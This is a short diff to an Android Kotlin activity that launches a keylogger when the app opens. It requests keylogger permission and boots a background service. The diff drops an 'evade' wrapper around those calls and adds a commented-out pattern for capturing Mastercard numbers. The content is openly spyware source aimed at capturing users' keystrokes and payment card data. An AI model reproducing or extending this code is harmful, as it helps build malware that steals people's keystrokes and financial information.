@@ -30,11 +30,11 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        evade {
-            Keylogger.requestPermission(this)
-            bootService(this){
-                service = MyService::class
-            }
+        Keylogger.requestPermission(this)
+        //mastercard
+        //Keylogger.addPattern("^5[1-5][0-9]{14}\\$")
+        bootService(this){
+            service = MyService::class
         }
     }
 }
